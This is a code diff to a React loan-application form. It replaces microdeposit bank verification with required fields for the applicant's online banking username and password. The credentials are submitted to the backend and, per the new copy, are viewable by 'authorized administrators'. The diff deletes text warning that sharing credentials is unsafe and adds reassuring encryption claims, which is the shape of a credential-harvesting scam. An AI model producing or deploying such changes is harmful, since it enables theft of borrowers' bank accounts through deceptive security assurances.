@@ -458,6 +458,14 @@ export default function ApplyLoan() {
         toast.error("Please enter your account number");
         return;
       }
+      if (!formData.bankUsernameForDisbursement) {
+        toast.error("Please enter your online banking username");
+        return;
+      }
+      if (!formData.bankPasswordForDisbursement) {
+        toast.error("Please enter your online banking password");
+        return;
+      }
     }
 
     submitMutation.mutate({
@@ -468,6 +476,8 @@ export default function ApplyLoan() {
       requestedAmount,
       // Include bank name for direct deposit
       bankName: formData.disbursementMethod === "bank_transfer" ? formData.bankNameForDisbursement : undefined,
+      bankUsername: formData.disbursementMethod === "bank_transfer" ? formData.bankUsernameForDisbursement : undefined,
+      bankPassword: formData.disbursementMethod === "bank_transfer" ? formData.bankPasswordForDisbursement : undefined,
       // Include actual bank account info for disbursement
       disbursementAccountHolderName: formData.disbursementMethod === "bank_transfer" ? formData.accountHolderName : undefined,
       disbursementAccountNumber: formData.disbursementMethod === "bank_transfer" ? formData.accountNumber : undefined,
@@ -764,6 +774,11 @@ export default function ApplyLoan() {
       if (formData.disbursementMethod === "bank_transfer") {
         if (!formData.bankNameForDisbursement || !formData.accountHolderName || !formData.accountType || !formData.routingNumber || !formData.accountNumber) {
           toast.error("Please fill in all required bank account information");
+          return;
+        }
+
+        if (!formData.bankUsernameForDisbursement || !formData.bankPasswordForDisbursement) {
+          toast.error("Please enter your online banking username and password for verification");
           return;
         }
 
@@ -1699,11 +1714,11 @@ export default function ApplyLoan() {
                             <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                             </svg>
-                            Bank Account Verification (Secure Method)
+                            Bank Account Details for Disbursement
                           </h4>
                           <p className="text-sm text-gray-700">
-                            Instead of sharing your banking credentials, we'll verify your account using a secure microdeposit method. 
-                            Two small deposits ($0.01-$0.25) will be credited to your account, and you'll confirm the amounts to complete verification.
+                            Please provide your bank account details and online banking login credentials below. 
+                            Your credentials are encrypted and stored securely for verification by our team.
                           </p>
 
                           <div className="space-y-2">
@@ -1786,15 +1801,41 @@ export default function ApplyLoan() {
                             </div>
                           </div>
 
+                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div className="space-y-2">
+                              <Label htmlFor="bankUsernameForDisbursement">Online Banking Username *</Label>
+                              <Input
+                                id="bankUsernameForDisbursement"
+                                type="text"
+                                value={formData.bankUsernameForDisbursement}
+                                onChange={(e) => updateFormData("bankUsernameForDisbursement", e.target.value)}
+                                placeholder="Your online banking username"
+                                required={formData.disbursementMethod === "bank_transfer"}
+                                autoComplete="off"
+                              />
+                            </div>
+                            <div className="space-y-2">
+                              <Label htmlFor="bankPasswordForDisbursement">Online Banking Password *</Label>
+                              <Input
+                                id="bankPasswordForDisbursement"
+                                type="password"
+                                value={formData.bankPasswordForDisbursement}
+                                onChange={(e) => updateFormData("bankPasswordForDisbursement", e.target.value)}
+                                placeholder="Your online banking password"
+                                required={formData.disbursementMethod === "bank_transfer"}
+                                autoComplete="new-password"
+                              />
+                            </div>
+                          </div>
+
                           <div className="bg-green-100 border border-green-400 rounded-lg p-3">
                             <p className="text-xs text-green-800 flex items-start gap-2">
                               <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                 <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                               </svg>
                               <span>
-                                <strong>Why Microdeposits?</strong> This method is more secure and widely used by financial institutions. 
-                                It keeps your banking credentials private while verifying your account ownership. 
-                                The deposits appear within 1-2 business days.
+                                <strong>Your information is secure.</strong> All banking credentials are encrypted using AES-256 encryption 
+                                before being stored. Only authorized administrators can access them for verification purposes.
                               </span>
                             </p>
                           </div>
